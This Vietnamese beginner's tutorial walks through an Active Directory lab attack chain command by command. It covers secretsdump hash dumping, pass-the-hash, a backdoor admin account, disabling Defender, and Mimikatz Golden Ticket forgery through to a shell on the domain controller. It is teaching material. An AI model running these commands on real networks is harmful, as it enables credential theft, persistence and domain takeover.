# 🛡️ Cẩm nang toàn tập câu lệnh Lab Active Directory (Red vs Blue)

*Tài liệu hướng dẫn chi tiết từ cơ bản đến nâng cao dành cho Người mới bắt đầu (Beginners & Freshers)*

Chào mừng bạn đến với tài liệu tổng hợp và giải nghĩa chi tiết toàn bộ các câu lệnh được sử dụng trong chiến dịch tấn công và phòng thủ Active Directory (Lab Red vs Blue). Tài liệu này không chỉ cung cấp câu lệnh thuần túy mà còn bóc tách từng tham số (flag), giải thích bản chất cơ chế hoạt động, ngữ cảnh sử dụng và ví dụ thực tế giúp người mới bắt đầu dễ dàng làm chủ công cụ mà không bị phụ thuộc vào việc sao chép-dán (copy-paste).

---

## 📖 PHẦN 1: TỪ ĐIỂN GIẢI NGHĨA THAM SỐ (FLAGS) CHO NGƯỜI MỚI

Khi làm việc với các công cụ bảo mật trên Terminal, các ký tự đứng sau dấu gạch ngang (ví dụ: `-i`, `-u`, `-p`, `-H`) được gọi là **Tham số (Flags/Arguments)**. Chúng đóng vai trò như các tùy chọn cấu hình để ra lệnh cho công cụ chạy đúng theo ý muốn của bạn.

### 1. Thao tác với Bộ công cụ Evil-WinRM (Quản trị & Tấn công Windows từ xa)

Cú pháp tổng quát: `evil-winrm -i [IP] -u [User] [Tham_số_mở_rộng]`

* **`-i` (IP / Target IP)**
    * **Ý nghĩa:** Chỉ định địa chỉ IP hoặc tên miền của máy mục tiêu (nạn nhân) mà bạn muốn kết nối tới.
    * **Khi nào nên dùng:** Luôn luôn bắt buộc phải có trong mọi câu lệnh kết nối từ xa.
    * **Ví dụ:** `-i 192.168.174.129` (Bảo công cụ kết nối trực tiếp đến máy có IP này).
* **`-u` (Username)**
    * **Ý nghĩa:** Khai báo tên tài khoản người dùng mà bạn muốn sử dụng để đăng nhập vào hệ thống đích.
    * **Khi nào nên dùng:** Bắt buộc trong mọi phiên xác thực.
    * **Ví dụ:** `-u Administrator` hoặc `-u thamtunhi`.
* **`-p` (Password)**
    * **Ý nghĩa:** Cung cấp mật khẩu dạng **chữ thô hiển thị rõ ràng (Cleartext)** của tài khoản được chỉ định ở tham số `-u`.
    * **Khi nào nên dùng:** Sử dụng khi bạn đã biết chính xác mật khẩu của tài khoản (do thu thập được từ cấu hình sai, đoán mò thành công, hoặc tài khoản do chính bạn tạo ra trước đó).
    * **Ví dụ:** `-p 'Matkhausieukho123@'`
    * *Lưu ý an toàn:* Đặt mật khẩu trong dấu nháy đơn `' '` để tránh việc các ký tự đặc biệt (như `@`, `$`, `!`) bị terminal Linux hiểu lầm là ký tự điều khiển hệ thống.
* **`-H` (NTLM Hash)**
    * **Ý nghĩa:** Cung cấp chuỗi băm mật khẩu định dạng **NTLM Hash** (chuỗi 32 ký tự Hex) thay thế hoàn toàn cho mật khẩu thô.
    * **Khi nào nên dùng:** Sử dụng khi thực hiện kỹ thuật **Pass-the-Hash (PtH)**. Trong môi trường Active Directory, hacker thường dump được chuỗi băm này từ bộ nhớ hoặc cơ sở dữ liệu chứ không có mật khẩu gốc. Bạn có thể dùng trực tiếp chuỗi này để đăng nhập mà không cần mất thời gian bẻ khóa (crack) mật khẩu.
    * **Ví dụ:** `-H 47d1f920ca4b2232ff8225e86a1f5a60`
    * *Quy tắc loại trừ:* Nếu đã dùng tham số `-H` thì **không** được dùng tham số `-p` và ngược lại. Chúng là hai phương thức xác thực hoàn toàn độc lập.
* **`-s` (Scripts Directory)**
    * **Ý nghĩa:** Chỉ định đường dẫn tới một thư mục **nằm trên máy Linux (Ubuntu) của bạn** chứa các file mã nguồn PowerShell (đuôi `.ps1`).
    * **Khi nào nên dùng:** Đây là tính năng cực kỳ quan trọng giúp ẩn mình (Defense Evasion). Thay vì bạn phải tải một file độc hại (như `Invoke-Mimikatz.ps1`) lên ổ cứng của máy Windows nạn nhân (hành vi này sẽ bị Windows Defender phát hiện và xóa ngay lập tức), tham số `-s` sẽ nạp trực tiếp script đó từ máy Linux **thẳng vào bộ nhớ RAM** của phiên PowerShell đang chạy trên Windows.
    * **Ví dụ:** `-s /home/an/cyber_tools/powershell_scripts/`

---

### 2. Thao tác với Bộ công cụ Impacket (Xác thực mạng & Di chuyển ngang)

Cú pháp tổng quát của Impacket sử dụng định dạng tài khoản giống như địa chỉ email: `Domain/User@TargetIP_hoặc_FQDN`

* **`-k` (Kerberos Authentication)**
    * **Ý nghĩa:** Ép buộc công cụ phải sử dụng giao thức xác thực **Kerberos** thay vì giao thức NTLM mặc định của hệ thống.
    * **Khi nào nên dùng:** Bắt buộc phải sử dụng khi thực hiện đòn tấn công **Pass-the-Ticket (PtT)** (ví dụ: sau khi bạn đã đúc thành công Vé Vàng - Golden Ticket hoặc Vé Bạc - Silver Ticket). Khi có tham số `-k`, công cụ sẽ tự động tìm kiếm file vé đang được lưu trong biến môi trường của Linux để đem đi xác thực với máy đích.
* **`-no-pass` (No Password)**
    * **Ý nghĩa:** Khai báo với hệ thống rằng bạn sẽ không nhập mật khẩu thô hay NTLM Hash nào cả.
    * **Khi nào nên dùng:** Luôn luôn đi kèm với tham số `-k`. Vì bạn đã trình ra "Thẻ VIP" là Vé Kerberos để chứng minh quyền hạn tối cao rồi, nên việc đòi mật khẩu thô lúc này là hoàn toàn không cần thiết.
* **`-dc-ip` (Domain Controller IP)**
    * **Ý nghĩa:** Chỉ định địa chỉ IP chính xác của máy chủ quản lý tên miền (Domain Controller - KDC).
    * **Khi nào nên dùng:** Sử dụng khi máy Linux của bạn không nằm trong hệ thống DNS của Domain Windows, khiến nó không thể tự động tìm đường đến máy chủ DC, hoặc khi bạn muốn tăng tốc độ xác thực bằng cách chỉ đích danh thực thể xử lý gói tin Kerberos.
    * **Ví dụ:** `-dc-ip 192.168.174.129`

---

## 🐧 PHẦN 2: TỔNG HỢP CHI TIẾT CÂU LỆNH TRÊN MÁY LINUX (UBUNTU)

### 1. Nhóm lệnh Khai thác dữ liệu từ xa (Credential Dumping)

#### Lệnh 1: Tấn công trích xuất cơ sở dữ liệu Active Directory (secretsdump)
```bash
impacket-secretsdump AnDLP.local/Administrator:'Matkhausieukho123@'@192.168.174.129
```

* **Chi tiết thành phần:**
    * `AnDLP.local`: Tên miền của hệ thống Windows Active Directory.
    * `/Administrator`: Tài khoản quản trị viên tối cao được dùng để chạy lệnh.
    * `:'Matkhausieukho123@'`: Mật khẩu thô của tài khoản Administrator (bọc trong dấu nháy đơn).
    * `@192.168.174.129`: Địa chỉ IP của máy Domain Controller mục tiêu.
* **Mục đích:** Sử dụng giao thức DRSUAPI để sao chép từ xa file cơ sở dữ liệu `NTDS.dit` của hệ thống. Kết quả trả về sẽ chứa toàn bộ NTLM Hash mật khẩu của tất cả người dùng và máy tính trong hệ thống mạng, bao gồm cả tài khoản chí mạng `krbtgt`.
* **Khi nào dùng:** Khi bạn đã có thông tin tài khoản Admin và muốn lấy toàn bộ hash mật khẩu để thực hiện các bước tấn công duy trì quyền lực (như đúc Vé Vàng).

#### Lệnh 2: Đột nhập hệ thống không cần mật khẩu (Pass-the-Hash)
```bash
evil-winrm -i 192.168.174.129 -u Administrator -H 47d1f920ca4b2232ff8225e86a1f5a60
```

* **Chi tiết thành phần:**
    * `-H 47d1f920...`: Chuỗi NTLM Hash của tài khoản Administrator thu được từ lệnh secretsdump phía trên.
* **Mục đích:** Vượt qua cơ chế kiểm tra mật khẩu thông thường để lấy về một phiên điều khiển PowerShell từ xa, chứng minh rằng chỉ cần sở hữu chuỗi băm mật khẩu là đã có toàn quyền như người dùng thật.
* **Khi nào dùng:** Khi quản trị viên thay đổi mật khẩu sang một chuỗi ký tự cực kỳ dài và khó, nhưng chuỗi băm NTLM cũ của họ chưa bị xóa hoặc thay đổi trong hệ thống.

---

### 2. Nhóm lệnh Cài đặt & Quản lý môi trường (Package & Environment Setup)

#### Lệnh 3: Cài đặt PIP và cập nhật kho phần mềm Linux
```bash
sudo apt update && sudo apt install python3-pip -y
```

* **Mục đích:** Cập nhật danh sách các phần mềm mới nhất của hệ điều hành Ubuntu (`sudo apt update`), sau đó cài đặt trình quản lý gói thư viện Python3 (`python3-pip`). Tham số `-y` tự động đồng ý với tất cả câu hỏi xác nhận cài đặt để quá trình chạy không bị ngắt quãng.
* **Khi nào dùng:** Thực hiện ngay khi thiết lập máy ảo tấn công mới để chuẩn bị môi trường chạy các công cụ Pentest viết bằng Python.

#### Lệnh 4: Cài đặt Impacket cô lập qua PIPX (Sửa lỗi Command Not Found)
```bash
sudo apt install pipx && pipx ensurepath && pipx install impacket
```

* **Mục đích:** Cài đặt công cụ `pipx` nhằm mục đích tạo ra một môi trường ảo riêng biệt cho từng công cụ Python. Lệnh `pipx ensurepath` giúp tự động thêm đường dẫn thư mục lưu file thực thi cục bộ (`~/.local/bin`) vào biến môi trường toàn cục `PATH` của Linux, giải quyết dứt điểm lỗi hệ thống không tìm thấy lệnh khi thực thi.
* **Khi nào dùng:** Nên dùng thay thế cho việc cài đặt bằng `pip` thông thường để tránh lỗi xung đột phiên bản giữa các công cụ bảo mật khác nhau trên Linux.

---

### 3. Nhóm lệnh Điều tra & Săn lùng Dấu vết Cục bộ (Forensics / History Discovery)

#### Lệnh 5: Truy vết lịch sử thực thi câu lệnh cũ
```bash
history | grep secretsdump
```

* **Mục đích:** Lấy ra toàn bộ danh sách các câu lệnh lưu trong bộ nhớ lịch sử của Terminal (`history`) sau đó lọc ra (`grep`) những dòng có chứa từ khóa `secretsdump`.
* **Khi nào dùng:** Khi bạn cần chạy lại một câu lệnh phức tạp đã từng thực hiện thành công trong quá khứ nhưng không thể nhớ chính xác cấu trúc hoặc các tham số đi kèm.

#### Lệnh 6: Tìm kiếm file rác hoặc file kết quả ẩn
```bash
ls -la | grep .ntds
```

* **Mục đích:** Liệt kê tất cả các file bao gồm cả file ẩn (`ls -la`) trong thư mục hiện hành và tìm xem có file nào chứa hậu tố `.ntds` hay không.
* **Khi nào dùng:** Dùng để kiểm tra xem dữ liệu nhạy cảm từ các đợt dump mật khẩu trước đó có vô tình bị bỏ quên trên ổ cứng máy tấn công hay không.

#### Lệnh 7: Quét tìm định dạng Hash bằng Biểu thức chính quy (Regex)
```bash
grep -rE '[0-9a-f]{32}' .
```

* **Chi tiết thành phần:**
    * `-r`: Quét đệ quy (tìm kiếm xuyên suốt vào tất cả các thư mục con).
    * `-E`: Sử dụng biểu thức chính quy mở rộng (Extended Regex).
    * `'[0-9a-f]{32}'`: Tìm kiếm chuỗi ký tự có độ dài đúng 32 ký tự và chỉ chứa các ký tự từ `0-9` và từ `a-f` (định dạng chuẩn của NTLM Hash).
    * `.`: Bắt đầu quét từ thư mục hiện tại.
* **Mục đích:** Lùng sục toàn bộ nội dung của mọi file văn bản để tìm ra các chuỗi hash mật khẩu bị lưu ngầm hoặc rò rỉ trong các file log.
* **Khi nào dùng:** Khi bạn thực hiện công việc trinh sát sau khai thác để thu thập thêm thông tin tài khoản bí mật.

---

### 4. Nhóm lệnh Xử lý Vé Kerberos (Pass-the-Ticket trên Linux)

#### Lệnh 8: Chuyển đổi định dạng vé giữa hai hệ điều hành
```bash
~/.local/bin/ticketConverter.py golden.kirbi golden.ccache
```

* **Mục đích:** Gọi script `ticketConverter.py` nằm trong kho lưu trữ của Impacket để chuyển file vé từ định dạng Windows (`.kirbi`) sang định dạng Linux (`.ccache`).
* **Khi nào dùng:** Bắt buộc phải thực hiện khi bạn đúc vé bằng Mimikatz trên Windows nhưng lại muốn mang chiếc vé đó sang máy Linux để thực hiện đòn tấn công từ xa.

#### Lệnh 9: Thay đổi quyền hạn siết chặt an ninh file vé
```bash
chmod 600 golden.ccache
```

* **Mục đích:** Thay đổi quyền hạn truy cập file (Change Mode), cấp quyền Đọc và Ghi cho duy nhất người sở hữu (User hiện tại), tước bỏ hoàn toàn quyền của nhóm (Group) và người dùng khác (Others).
* **Khi nào dùng:** Bắt buộc phải chạy lệnh này trước khi nạp vé vào hệ thống Linux, nếu không dịch vụ GSSAPI/Kerberos của Linux sẽ từ chối đọc file vì lý do an toàn bảo mật thông tin.

#### Lệnh 10: Nạp vé vào phiên làm việc hiện tại
```bash
export KRB5CCNAME=golden.ccache
```

* **Mục đích:** Định nghĩa một biến môi trường tạm thời mang tên `KRB5CCNAME` trỏ thẳng tới file vé vàng của bạn. Lệnh này chỉ có hiệu lực duy nhất tại tab Terminal đang mở.
* **Khi nào dùng:** Chạy ngay trước khi thực hiện các lệnh tấn công mạng bằng Impacket để công cụ biết nơi lấy vé đi xác thực.

#### Lệnh 11: Kiểm tra trạng thái và thông tin vé trên Linux
```bash
klist
```

* **Mục đích:** Liệt kê thông tin chi tiết của chiếc vé đang nằm trong bộ nhớ cache môi trường Linux nhằm kiểm tra xem vé có hợp lệ không, tên người dùng giả mạo là gì và thời hạn sử dụng của vé kéo dài đến khi nào.

---

### 5. Nhóm lệnh Đột kích Hệ thống qua Tên miền (Final Attack Lateral Movement)

#### Lệnh 12: Đột kích chiếm Shell qua WMI bằng Vé Vàng Kerberos
```bash
impacket-wmiexec -k -no-pass AnDLP.local/HackerVip@WIN-C1KC5PA6GBA.AnDLP.local
```

* **Mục đích:** Sử dụng giao thức Quản trị Windows (WMI) kết hợp với chiếc vé vàng Kerberos đã nạp sẵn để mở một phiên tương tác dòng lệnh (`C:\>`) trên máy chủ Domain Controller từ xa một cách hoàn toàn ẩn mình, không cần cung cấp mật khẩu thô và tránh được phần lớn các cơ chế giám sát log thông thường.
* **Khi nào dùng:** Đây là đòn đánh cuối cùng (The Grand Finale) để khẳng định bạn đã làm chủ hoàn toàn hệ thống mạng Active Directory ở cấp độ cao nhất.

---

## 🪟 PHẦN 3: TỔNG HỢP CHI TIẾT CÂU LỆNH TRÊN MÁY WINDOWS (POWERSHELL / EVIL-WINRM)

*Lưu ý: Các câu lệnh này được thực hiện bên trong môi trường dòng lệnh PowerShell của Windows, thông qua phiên kết nối từ xa `evil-winrm`.*

### 1. Nhóm lệnh Trinh sát & Thu thập Thông tin Cục bộ (Information Gathering)

#### Lệnh 13: Xác định ngữ cảnh quyền hạn hiện tại
```powershell
whoami
```

* **Mục đích:** Hiển thị tên của tài khoản đang điều khiển phiên làm việc hiện tại. Quyết định xem bạn có đủ đặc quyền để thực hiện các hành động can thiệp sâu vào hệ thống hay không.

#### Lệnh 14: Trích xuất mã định danh bảo mật SID
```powershell
whoami /user
```

* **Mục đích:** Hiển thị tên tài khoản cùng với chuỗi mã định danh **SID (Security Identifier)** của nó.
* **Ứng dụng thực tế:** Hacker sẽ lấy chuỗi SID này, cắt bỏ phần số định danh của User ở cuối cùng (ví dụ: cắt bỏ phần `-1106`) để thu được **Domain SID** nguyên bản — một thành phần không thể thiếu để làm nguyên liệu đúc Vé Vàng.

#### Lệnh 15: Kiểm tra danh sách người dùng trên máy mục tiêu
```powershell
net user
```

* **Mục đích:** Liệt kê toàn bộ các tài khoản người dùng cục bộ đang có mặt trên hệ điều hành này để phục vụ cho việc lập bản đồ tài khoản tấn công.

---

### 2. Nhóm lệnh Thiết lập Cửa sau Duy trì Quyền lực (Persistence)

#### Lệnh 16: Tạo thêm người dùng mới bí mật
```powershell
net user thamtunhi 12345678a@ /add
```

* **Mục đích:** Tạo một tài khoản người dùng mới trên hệ thống Windows mang tên `thamtunhi` với mật khẩu là `12345678a@`.
* **Khi nào dùng:** Thực hiện trong giai đoạn thiết lập cửa sau (Persistence) để đảm bảo dù Admin hệ thống có phát hiện ra cuộc tấn công và đổi mật khẩu của tài khoản `Administrator`, hacker vẫn có một tài khoản dự phòng khác để đăng nhập lại vào hệ thống.

#### Lệnh 17: Nâng cấp đặc quyền tối cao cho tài khoản cửa sau
```powershell
net localgroup administrators thamtunhi /add
```

* **Mục đích:** Điền tên tài khoản `thamtunhi` vào danh sách thành viên của nhóm quản trị viên cục bộ (`administrators`), cấp cho tài khoản này toàn quyền kiểm soát tối cao trên máy tính hiện tại.

---

### 3. Nhóm lệnh Bịt mắt Hàng phòng thủ (Defense Evasion)

#### Lệnh 18: Kiểm tra trạng thái hoạt động của trình diệt virus
```powershell
Get-MpComputerStatus | select RealTimeProtectionEnabled
```

* **Mục đích:** Truy vấn trạng thái của Windows Defender, kiểm tra xem tính năng giám sát thời gian thực (`RealTimeProtectionEnabled`) đang Bật (`True`) hay Tắt (`False`).

#### Lệnh 19: Tắt tính năng bảo vệ thời gian thực của Windows Defender
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

* **Mục đích:** Ép buộc Windows Defender dừng việc quét và giám sát hành vi của các file chạy trên hệ thống.
* **Khi nào dùng:** Bắt buộc phải chạy lệnh này bằng quyền Admin trước khi thực hiện hành động tải lên hoặc chạy các công cụ hack nổi tiếng như Mimikatz, nếu không file thực thi sẽ bị hệ thống tự động xóa và cô lập ngay lập tức.

---

### 4. Nhóm lệnh Vận chuyển File (Evil-WinRM Built-in Commands)

#### Lệnh 20: Đẩy file độc hại từ máy tấn công lên máy nạn nhân
```powershell
upload /home/an/tools/mimikatz.exe
```

* **Mục đích:** Ra lệnh cho công cụ Evil-WinRM thực hiện truyền tải file `mimikatz.exe` từ thư mục trên máy Linux lên thư mục làm việc hiện hành của máy Windows.

#### Lệnh 21: Kéo dữ liệu chiếm đoạt được về máy tấn công
```powershell
download golden.kirbi
```

* **Mục đích:** Lấy file vé vàng `golden.kirbi` vừa được đúc trên Windows về máy Linux để chuẩn bị cho các bước chuyển đổi định dạng và tấn công từ xa.

---

### 5. Nhóm lệnh Khai hỏa Mimikatz & Tạo tác Vé Kerberos (Credential Forgery)

#### Lệnh 22: Đúc Vé Vàng bằng cơ chế chạy lệnh một dòng không tương tác
```powershell
.\mimikatz.exe "privilege::debug" "kerberos::golden /domain:AnDLP.local /sid:S-1-5-21-3417954494-1957840465-455922886 /rc4:b320d48c476d8ee41dc9f8ad64d354c2 /user:HackerVip /ticket:golden.kirbi" "exit"
```

* **Chi tiết thành phần câu lệnh bên trong Mimikatz:**
    * `"privilege::debug"`: Yêu cầu cấp quyền gỡ lỗi hệ thống. Đây là lệnh bắt buộc phải chạy đầu tiên để Mimikatz có đủ quyền can thiệp và tương tác với tiến trình nhạy cảm `lsass.exe` của Windows.
    * `"kerberos::golden"`: Lệnh kích hoạt tính năng đúc Vé Vàng (Golden Ticket).
    * `/domain:AnDLP.local`: Khai báo tên miền của hệ thống muốn giả mạo.
    * `/sid:S-1-5-21-...`: Điền chuỗi **Domain SID** chuẩn xác đã thu thập được ở Lệnh 14.
    * `/rc4:b320d48c...`: Cung cấp mã băm NTLM của tài khoản `krbtgt` thu được từ Lệnh 1. Khóa này được dùng để ký số lên chiếc vé giả, biến chiếc vé giả thành hợp pháp trong mắt hệ thống xác thực.
    * `/user:HackerVip`: Tên người dùng giả mạo mà bạn tự tạo ra để gán vào chiếc vé (Tài khoản này hoàn toàn không cần tồn tại thực tế trong hệ thống AD).
    * `/ticket:golden.kirbi`: Đặt tên file kết quả đầu ra sau khi đúc vé thành công.
    * `"exit"`: Ép Mimikatz đóng lại ngay lập tức sau khi hoàn thành nhiệm vụ.
* **Tại sao phải viết trên một dòng?** Vì môi trường kết nối từ xa của Evil-WinRM không phải là một Terminal tương tác thực thụ, nếu bạn chỉ gõ `.\mimikatz.exe` để mở giao diện của nó, tiến trình sẽ bị đóng băng (treo console) và spam ký tự liên tục mà không nhận lệnh từ bàn phím. Việc truyền tất cả lệnh vào một dòng rồi thoát ra là giải pháp hoàn hảo để tự động hóa quy trình.

---

### 6. Nhóm lệnh Hậu khai thác & Kiểm tra Quyền lực Mạng (Post-Exploitation)

#### Lệnh 23: Kiểm tra quyền hạn tối cao bằng cách truy cập thư mục ẩn của Domain Controller
```powershell
dir \\WIN-C1KC5PA6GBA\C$
```

* **Mục đích:** Thử nghiệm dùng giao thức chia sẻ file SMB mạng để liệt kê danh sách file nằm trong ổ đĩa hệ thống ẩn (`C$`) của máy chủ Domain Controller từ xa (`WIN-C1KC5PA6GBA`).
* **Bản chất:** Theo cơ chế bảo mật của Windows, chỉ có những tài khoản thuộc nhóm quyền lực nhất hệ thống (`Domain Admins`) mới được phép truy cập thẳng vào đường dẫn ẩn này. Nếu lệnh này thực thi thành công và trả về danh sách file, điều đó xác nhận chiếc vé vàng của bạn hoạt động hoàn hảo và bạn đang sở hữu đặc quyền tối thượng trên toàn hệ thống mạng doanh nghiệp.
